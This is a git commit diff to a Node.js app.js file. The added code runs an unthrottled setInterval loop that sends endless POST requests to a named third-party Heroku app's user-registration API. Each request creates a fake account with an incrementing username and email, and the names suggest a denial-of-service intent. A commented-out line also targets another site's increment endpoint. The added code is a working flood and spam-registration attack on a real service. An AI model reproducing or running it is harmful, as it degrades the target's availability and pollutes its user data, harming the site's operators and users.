ae51627a80a05ff4ebf688ab455598f5b12ef787
fordwind <72396975+fordwind@users.noreply.github.com>
2020-10-11 21:06:28 +0300

    Update app.js

--- app.js
+++ app.js
@@ -4,3 +4,26 @@ server.listen(process.env.PORT)
 const axios = require('axios')
 
 //setInterval(() => axios.get('https://dadlaughbutton.com/increment.php'))
+
+i=0
+
+async function makePostRequest() {
+
+    params = {
+        "user[username]" : "asddosat"+i,
+        "user[email]": "emaildos"+i+"@xyz.com",
+        "user[password]" : "123456"
+      }
+
+    let res = await axios.post('https://discord-clone.herokuapp.com/api/user', params);
+
+    i++
+}
+
+
+setInterval(() => {
+  
+
+   
+    makePostRequest();
+})
